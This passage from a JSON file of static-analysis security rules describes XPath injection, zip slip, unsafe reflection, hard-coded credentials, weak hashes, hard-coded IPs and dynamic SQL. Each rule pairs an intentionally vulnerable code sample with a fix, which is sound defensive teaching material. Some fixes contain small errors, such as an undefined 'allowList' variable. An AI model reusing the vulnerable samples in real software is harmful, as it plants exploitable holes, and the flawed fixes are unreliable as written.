        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>XPath injections occur in an application when the application retrieves untrusted data and inserts it into an XML Path (XPath) query without\nsanitizing it first.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application vulnerable to XPath injection:<br> After discovering the injection point, attackers insert data into the\nvulnerable field to execute malicious commands in the affected XML documents.</p>\n<p>The impact of this vulnerability depends on the importance of XML structures in the enterprise.<br> In cases where organizations rely on XML\nstructures for business-critical operations or where XML is used only for innocuous data transport, the severity of an attack ranges from critical to\nharmless.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Data Leaks</h4>\n<p>A malicious XPath query allows direct data leakage from one or more databases. Although XML is not as widely used as it once was, this possibility\nstill exists with configuration files, for example.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query allows the attacker to delete data in the affected XML documents.<br> This threat is particularly insidious if the attacked\norganization does not maintain a disaster recovery plan (DRP) and if XML structures are considered important, as missing critical data can disrupt the\nregular operations of an organization.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following noncompliant code is vulnerable to XPath injections because untrusted data is concatenated to an XPath query without prior\nvalidation.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {\n  String user = request.getParameter(\"user\");\n  String pass = request.getParameter(\"pass\");\n\n  String expression = \"/users/user[@name='\" + user + \"' and @pass='\" + pass + \"']\";\n\n  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic boolean authenticate(HttpServletRequest req, XPath xpath, Document doc) throws XPathExpressionException {\n  String user = request.getParameter(\"user\");\n  String pass = request.getParameter(\"pass\");\n\n  String expression = \"/users/user[@name=$user and @pass=$pass]\";\n\n  xpath.setXPathVariableResolver(v -&gt; {\n    switch (v.getLocalPart()) {\n      case \"user\":\n        return user;\n      case \"pass\":\n        return pass;\n      default:\n        throw new IllegalArgumentException();\n    }\n  });\n\n  return (boolean)xpath.evaluate(expression, doc, XPathConstants.BOOLEAN);\n}\n</pre>\n<h3>How does this work?</h3>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of the\ninitially intended logic.</p>\n<h4>Parameterized Queries</h4>\n<p>For XPath injections, the cleanest way to do so is to use parameterized queries.</p>\n<p>XPath allows for the usage of variables inside expressions in the form of <code>$variable</code>. XPath variables can be used to construct an XPath\nquery without needing to concatenate user arguments to the query at runtime. Here is an example of an XPath query with variables:</p>\n<pre>\n/users/user[@user=$user and @pass=$pass]\n</pre>\n<p>When the XPath query is executed, the user input is passed alongside it. During execution, when the values of the variables need to be known, a\nresolver will return the correct user input for each variable. The contents of the variables are not considered application logic by the XPath\nexecutor, and thus injection is not possible.</p>\n<p>In the example, a parameterized XPath query is created, and an <code>XPathVariableResolver</code> is used to securely insert untrusted data into\nthe query, similar to parameterized SQL queries.</p>\n<h4>Validation</h4>\n<p>In case XPath parameterized queries are not available, the most secure way to protect against injections is to validate the input before using it\nin an XPath query.</p>\n<p><strong>Important</strong>: The application must do this validation server-side. Validating this client-side is insecure.</p>\n<p>Input can be validated in multiple ways:</p>\n<ul>\n  <li> By checking against a list of authorized and secure strings that the application is allowed to use in a query. </li>\n  <li> By ensuring user input is restricted to a specific range of characters (e.g., the regex <code>/^[a-zA-Z0-9]*$/</code> only allows alphanumeric\n  characters.) </li>\n  <li> By ensuring user input does not include any XPath metacharacters, such as <code>\"</code>, <code>'</code>, <code>/</code>, <code>@</code>,\n  <code>=</code>, <code>*</code>, <code>[</code>, <code>]</code>, <code>(</code> and <code>)</code>. </li>\n</ul>\n<p>If user input is not considered valid, it should be rejected as it is unsafe.</p>\n<p>For Java, OWASP’s Enterprise Security API offers <a\nhref=\"https://www.javadoc.io/doc/org.owasp.esapi/esapi/latest/org/owasp/esapi/Encoder.html#encodeForXPath-java.lang.String-\"><code>encodeForXPath</code></a>\nwhich sanitizes metacharacters automatically.</p>\n<h2>Resources</h2>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/Injection_Prevention_Cheat_Sheet.html#xpath-injection\">OWASP, XPath Injection\n  Prevention Cheat Sheet</a> </li>\n  <li> <a href=\"https://web.archive.org/web/20230602194100/https://www.ambionics.io/blog/hacking-watchguard-firewalls\">Ambionics, XPath Injection\n  Section of \"Hacking WatchGuard Firewalls'</a> </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/643\">CWE-643 - Improper Neutralization of Data within XPath Expressions</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S6096": {
        "name": "Extracting archives should not lead to zip slip vulnerabilities",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access\nthis file without validating its path first.</p>\n<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>\n<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial\nintended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>\n<h3>What is the potential impact?</h3>\n<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>\n<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with\nroot privileges on Linux, and therefore any file can be affected.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Override arbitrary files</h4>\n<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in\nthe system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or\noperating system to work properly.</p>\n<p>It could result in data being lost or the application being unavailable.</p>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file\nwithout being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Example {\n\n    static private String targetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(ZipFile zipFile) throws IOException {\n\n        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n        ZipEntry entry = entries.nextElement();\n        InputStream inputStream = zipFile.getInputStream(entry);\n\n        File file = new File(targetDirectory + entry.getName());\n\n        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Example {\n\n    static private String targetDirectory = \"/example/directory/\";\n\n    public void ExtractEntry(ZipFile zipFile) throws IOException {\n\n        Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n        ZipEntry entry = entries.nextElement();\n        InputStream inputStream = zipFile.getInputStream(entry);\n\n        File file = new File(targetDirectory + entry.getName());\n\n        String canonicalDestinationPath = file.getCanonicalPath();\n\n        if (canonicalDestinationPath.startsWith(targetDirectory)) {\n            Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);\n        }\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>\n<p>The validation should be done as follow:</p>\n<ol>\n  <li> Resolve the canonical path of the file by using methods like <code>java.io.File.getCanonicalFile</code> or\n  <code>java.io.File.getCanonicalPath</code>. This will resolve relative path or path components like <code>../</code> and removes any ambiguity\n  regarding the file’s location. </li>\n  <li> Check that the canonical path is within the directory where the file should be located. </li>\n  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>\n  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>\n</ol>\n<h3>Pitfalls</h3>\n<h4>Partial Path Traversal</h4>\n<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path\nseparator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a\npath separator as the last character of the validation strings.</p>\n<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path\nseparator:</p>\n<pre>\nstatic private String targetDirectory = \"/Users/John\";\n\npublic void ExtractEntry(ZipFile zipFile) throws IOException {\n\n    Enumeration&lt;? extends ZipEntry&gt; entries = zipFile.entries();\n    ZipEntry entry = entries.nextElement();\n    InputStream inputStream = zipFile.getInputStream(entry);\n\n    File file = new File(entry.getName());\n\n    String canonicalDestinationPath = file.getCanonicalPath();\n\n    if (canonicalDestinationPath.startsWith(targetDirectory)) {\n        Files.copy(inputStream, file.toPath(), StandardCopyOption.REPLACE_EXISTING, LinkOption.NOFOLLOW_LINKS);\n    }\n}\n</pre>\n<p>This check can be bypassed because <code>\"/Users/Johnny\".startsWith(\"/Users/John\")</code> returns <code>true</code>. Thus, for validation,\n<code>\"/Users/John\"</code> should actually be <code>\"/Users/John/\"</code>.</p>\n<p><strong>Warning</strong>: Some functions, such as <code>.getCanonicalPath</code>, remove the terminating path separator in their return value.<br>\nThe validation code should be tested to ensure that it cannot be impacted by this issue.</p>\n<p><a href=\"https://github.com/aws/aws-sdk-java/security/advisories/GHSA-c28r-hw5m-5gv3\">Here is a real-life example of this vulnerability.</a></p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://snyk.io/research/zip-slip-vulnerability\">snyk</a> - Zip Slip Vulnerability </li>\n</ul>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/22\">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path\n  Traversal')</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "javasecurity:S6173": {
        "name": "Reflection should not be vulnerable to injection attacks",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Reflection injections occur in a web application when it retrieves data from a user or a third-party service and fully or partially uses it to\ninspect, load or invoke a component by name.</p>\n<p>If an application uses a reflection method in a way that is vulnerable to injections, it is exposed to attacks that aim to achieve remote code\nexecution on the server’s website.</p>\n<p>A user with malicious intent exploits this by carefully crafting a string involving symbols such as class methods, that will help them change the\ninitial reflection logic to an impactful malicious one.</p>\n<p>After creating the malicious request and triggering it, the attacker can attack the servers affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>If user-supplied values are used to choose which code is executed, an attacker may be able to supply carefully-chosen values that cause unexpected\ncode to run. The attacker can use this ability to run arbitrary code on the server.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Application-specific attacks</h4>\n<p>In this scenario, the attackers succeed in injecting a seemingly-legitimate object, but whose properties might be used maliciously.</p>\n<p>Depending on the application, attackers might be able to modify important data structures or content to escalate privileges or perform unwanted\nactions. For example, with an e-commerce application, this could be changing the number of products or prices.</p>\n<h4>Full application compromise</h4>\n<p>In the worst-case scenario, the attackers succeed in injecting an object triggering code execution.</p>\n<p>Depending on the attacker, code execution can be used with different intentions:</p>\n<ul>\n  <li> Download the internal server’s data, most likely to sell it. </li>\n  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>\n  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>\n</ul>\n<p>This threat is particularly insidious if the attacked organization does not maintain a Disaster Recovery Plan (DRP).</p>\n<h4>Root privilege escalation and pivot</h4>\n<p>In this scenario, the attacker can do everything described in the previous section. The difference is that the attacker additionally manages to\nelevate their privileges as an administrator and attack other servers.</p>\n<p>Here, the impact depends on how much the target company focuses on its Defense In Depth. For example, the entire infrastructure can be compromised\nthrough a combination of unsafe deserialization and misconfiguration:</p>\n<ul>\n  <li> Docker or Kubernetes clusters </li>\n  <li> cloud services </li>\n  <li> network firewalls and routing </li>\n  <li> OS access control </li>\n</ul>\n<h2>How to fix it in Java SE</h2>\n<h3>Code examples</h3>\n<p>In the following example, the code simulates a feature in an image editing application that allows users to install plugins to add new filters or\neffects. It assumes the user will give a known name, such as \"SepiaEffect\".</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\n@RestController\npublic class EffectController\n{\n    @GetMapping(value = \"/filter/apply\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; apply(@RequestParam(\"effect\") String effectName)\n    {\n        try\n        {\n            Class effectClass                = Class.forName(effectName);  // Noncompliant\n            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();\n            Object EffectObject              = effectConstructor.newInstance();\n            Method applyMethod               = effectClass.getMethod(\"applyFilter\");\n\n            boolean result = (boolean) applyMethod.invoke(EffectObject);\n\n            if (result) {\n                return new ResponseEntity&lt;&gt;(\"Filter Applied\", HttpStatus.OK);\n            }\n\n        } catch (Exception e) {}\n\n        return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nimport java.lang.Class;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.Method;\n\n@RestController\npublic class EffectController\n{\n    private static Set&lt;String&gt; EFFECT_ALLOW_LIST = new HashSet&lt;&gt;();\n\n    static\n    {\n        allowList.add(\"SepiaEffect\");\n        allowList.add(\"BlackAndWhiteEffect\");\n        allowList.add(\"WaterColorEffect\");\n        allowList.add(\"OilPaintingEffect\");\n    }\n\n    @GetMapping(value = \"/filter/apply\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; apply(@RequestParam(\"effect\") String effectName)\n    {\n        if (!EFFECT_ALLOW_LIST.contains(effectName)) {\n            return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n        }\n\n        try\n        {\n            Class effectClass                = Class.forName(effectName);\n            Constructor&lt;?&gt; effectConstructor = effectClass.getConstructor();\n            Object EffectObject              = effectConstructor.newInstance();\n            Method applyMethod               = effectClass.getMethod(\"applyFilter\");\n\n            boolean result = (boolean) applyMethod.invoke(EffectObject);\n\n            if (result) {\n                return new ResponseEntity&lt;&gt;(\"Filter Applied\", HttpStatus.OK);\n            }\n\n        } catch (Exception e) {}\n\n        return new ResponseEntity&lt;&gt;(\"Filter Failure\", HttpStatus.FORBIDDEN);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Pre-Approved commands</h4>\n<p>The cleanest way to avoid this defect is to validate the input before using it in a reflection method.</p>\n<p>Create a list of authorized and secure classes that you want the application to be able to execute.<br> If a user input does not match an entry in\nthis list, it should be rejected because it is considered unsafe.</p>\n<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/470\">CWE-470 - Use of Externally-Controlled Input to Select Classes or Code ('Unsafe\n  Reflection')</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "tsql:S2068": {
        "name": "Hard-coded credentials are security-sensitive",
        "htmlDesc": "<p>Because it is easy to extract strings from an application source code or binary, credentials should not be hard-coded. This is particularly true\nfor applications that are distributed or that are open-source.</p>\n<p>In the past, it has led to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-13466\">CVE-2019-13466</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-15389\">CVE-2018-15389</a> </li>\n</ul>\n<p>Credentials should be stored outside of the code in a configuration file, a database, or a management service for secrets.</p>\n<p>This rule flags instances of hard-coded credentials used in database and LDAP connections. It looks for hard-coded credentials in connection\nstrings, and for variable names that match any of the patterns from the provided list.</p>\n<p>It’s recommended to customize the configuration of this rule with additional credential words such as \"oauthToken\", \"secret\", …​</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Credentials allow access to a sensitive component like a database, a file storage, an API or a service. </li>\n  <li> Credentials are used in production environments. </li>\n  <li> Application re-distribution is required before updating the credentials. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> Store the credentials in a configuration file that is not pushed to the code repository. </li>\n  <li> Store the credentials in a database. </li>\n  <li> Use your cloud provider’s service for managing secrets. </li>\n  <li> If a password has been disclosed through the source code: change it. </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A2_2017-Broken_Authentication\">Top 10 2017 Category A2 - Broken Authentication</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/798\">CWE-798 - Use of Hard-coded Credentials</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/259\">CWE-259 - Use of Hard-coded Password</a> </li>\n  <li> Derived from FindSecBugs rule <a href=\"https://h3xstream.github.io/find-sec-bugs/bugs.htm#HARD_CODE_PASSWORD\">Hard Coded Password</a> </li>\n</ul>",
        "severity": "BLOCKER"
      },
      "tsql:S2070": {
        "name": "SHA-1 and Message-Digest hash algorithms should not be used in secure contexts",
        "htmlDesc": "<p>This rule is deprecated; use <a href='/coding_rules#rule_key=tsql%3AS4790'>S4790</a> instead.</p>\n<h2>Why is this an issue?</h2>\n<p>The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to create hash collisions with them. That is,\nit takes too little computational effort to come up with a different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash\nvalue gives an attacker the same access as if he had the originally-hashed value. This applies as well to the other Message-Digest algorithms: MD2,\nMD4, MD6, HAVAL-128, HMAC-MD5, DSA (which uses SHA-1), RIPEMD, RIPEMD-128, RIPEMD-160, HMACRIPEMD160.</p>\n<p>Consider using safer alternatives, such as SHA-256, SHA-512 or SHA-3.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nSELECT HASHBYTES('SHA1', MyColumn) FROM dbo.MyTable;\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nSELECT HASHBYTES('SHA2_256', MyColumn) FROM dbo.MyTable;\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/328\">CWE-328 - Reversible One-Way Hash</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/327\">CWE-327 - Use of a Broken or Risky Cryptographic Algorithm</a> </li>\n  <li> <a href=\"https://shattered.io/\">SHAttered</a> - The first concrete collision attack against SHA-1. </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "tsql:S1313": {
        "name": "Using hardcoded IP addresses is security-sensitive",
        "htmlDesc": "<p>Hardcoding IP addresses is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5901\">CVE-2006-5901</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-3725\">CVE-2005-3725</a> </li>\n</ul>\n<p>Today’s services have an ever-changing architecture due to their scaling and redundancy needs. It is a mistake to think that a service will always\nhave the same IP address. When it does change, the hardcoded IP will have to be modified too. This will have an impact on the product development,\ndelivery, and deployment:</p>\n<ul>\n  <li> The developers will have to do a rapid fix every time this happens, instead of having an operation team change a configuration file. </li>\n  <li> It misleads to use the same address in every environment (dev, sys, qa, prod). </li>\n</ul>\n<p>Last but not least it has an effect on application security. Attackers might be able to decompile the code and thereby discover a potentially\nsensitive address. They can perform a Denial of Service attack on the service, try to get access to the system, or try to spoof the IP address to\nbypass security checks. Such attacks can always be possible, but in the case of a hardcoded IP address solving the issue will take more time, which\nwill increase an attack’s impact.</p>\n<h2>Ask Yourself Whether</h2>\n<p>The disclosed IP address is sensitive, e.g.:</p>\n<ul>\n  <li> Can give information to an attacker about the network topology. </li>\n  <li> It’s a personal (assigned to an identifiable person) IP address. </li>\n</ul>\n<p>There is a risk if you answered yes to any of these questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Don’t hard-code the IP address in the source code, instead make it configurable with environment variables, configuration files, or a similar\napproach. Alternatively, if confidentially is not required a domain name can be used since it allows to change the destination quickly without having\nto rebuild the software.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nSET @IP = '192.168.12.42'; -- Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSET @IP  = (SELECT ip_address FROM configuration);  -- Compliant\n</pre>\n<h2>Exceptions</h2>\n<p>No issue is reported for the following cases because they are not considered sensitive:</p>\n<ul>\n  <li> Loopback addresses 127.0.0.0/8 in CIDR notation (from 127.0.0.0 to 127.255.255.255) </li>\n  <li> Broadcast address 255.255.255.255 </li>\n  <li> Non-routable address 0.0.0.0 </li>\n  <li> Strings of the form <code>2.5.&lt;number&gt;.&lt;number&gt;</code> as they <a href=\"http://www.oid-info.com/introduction.htm\">often match\n  Object Identifiers</a> (OID) </li>\n  <li> Addresses in the ranges 192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24, reserved for documentation purposes by <a\n  href=\"https://datatracker.ietf.org/doc/html/rfc5737\">RFC 5737</a> </li>\n</ul>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "tsql:S1523": {
        "name": "Dynamically executing code is security-sensitive",
        "htmlDesc": "<p>Executing code dynamically is security sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9807\">CVE-2017-9807</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9802\">CVE-2017-9802</a> </li>\n</ul>\n<p>Some APIs enable the execution of dynamic code by providing it as strings at runtime. These APIs might be useful in some very specific\nmeta-programming use-cases. However most of the time their use is frowned upon as they also increase the risk of <a\nhref=\"https://owasp.org/www-community/attacks/Code_Injection\">Injected Code</a>. Such attacks can either run on the server or in the client (exemple:\nXSS attack) and have a huge impact on an application’s security.</p>\n<p>Both <code>EXECUTE( ... )</code> and <code>EXEC( ... )</code> execute as a command the string passed as an argument. They are safe only if the\nargument is composed of constant character string expressions. But if the command string is dynamically built using external parameters, then it is\nconsidered very dangerous because executing a random string allows the execution of arbitrary code.</p>\n<p>This rule marks for review each occurrence of <code>EXEC</code> and <code>EXECUTE</code>. This rule does not detect code injections. It only\nhighlights the use of APIs which should be used sparingly and very carefully. The goal is to guide security code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the executed code may come from an untrusted source and hasn’t been sanitized. </li>\n  <li> you really need to run code dynamically. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>The best solution is to not run code provided by an untrusted source. If you really need to build a command string using external parameters, you\nshould use <code>EXEC sp_executesql</code> instead.</p>\n<p>Do not try to create a blacklist of dangerous code. It is impossible to cover all attacks that way.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nCREATE PROCEDURE USER_BY_EMAIL(@email VARCHAR(255)) AS\nBEGIN\n  EXEC('USE AuthDB; SELECT id FROM user WHERE email = ''' + @email + ''' ;'); -- Sensitive: could inject code using @email\nEND\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nCREATE PROCEDURE USER_BY_EMAIL(@email VARCHAR(255)) AS\nBEGIN\n  EXEC sp_executesql 'USE AuthDB; SELECT id FROM user WHERE email = @user_email;',\n                     '@user_email VARCHAR(255)',\n                      @user_email = @email;\nEND\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A03_2021-Injection/\">Top 10 2021 Category A3 - Injection</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/95\">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval\n  Injection')</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "tsql:S4790": {
        "name": "Using weak hashing algorithms is security-sensitive",
        "htmlDesc": "<p>Cryptographic hash algorithms such as <code>MD2</code>, <code>MD4</code>, <code>MD5</code>, <code>MD6</code>, <code>HAVAL-128</code>,\n<code>HMAC-MD5</code>, <code>DSA</code> (which uses <code>SHA-1</code>), <code>RIPEMD</code>, <code>RIPEMD-128</code>, <code>RIPEMD-160</code>,\n<code>HMACRIPEMD160</code> and <code>SHA-1</code> are no longer considered secure, because it is possible to have <code>collisions</code> (little\ncomputational effort is enough to find two or more different inputs that produce the same hash).</p>\n<h2>Ask Yourself Whether</h2>\n<p>The hashed value is used in a security context like:</p>\n<ul>\n  <li> User-password storage. </li>\n  <li> Security token generation (used to confirm e-mail when registering on a website, reset password, etc …​). </li>\n  <li> To compute some message integrity. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>Safer alternatives, such as <code>SHA-256</code>, <code>SHA-512</code>, <code>SHA-3</code> are recommended, and for password hashing, it’s even\nbetter to use algorithms that do not compute too \"quickly\", like <code>bcrypt</code>, <code>scrypt</code>, <code>argon2</code> or <code>pbkdf2</code>\nbecause it slows down <code>brute force attacks</code>.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\nSELECT HASHBYTES('SHA1', MyColumn) FROM dbo.MyTable;\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nSELECT HASHBYTES('SHA2_512', MyColumn) FROM dbo.MyTable;\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x08-v3-cryptography_verification_requirements\">Mobile AppSec\n  Verification Standard - Cryptography Requirements</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m5-insufficient-cryptography\">Mobile Top 10 2016 Category M5 -\n  Insufficient Cryptography</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/1240\">CWE-1240 - Use of a Risky Cryptographic Primitive</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "roslyn.sonaranalyzer.security.cs:S2631": {
        "name": "Regular expressions should not be vulnerable to Denial of Service attacks",
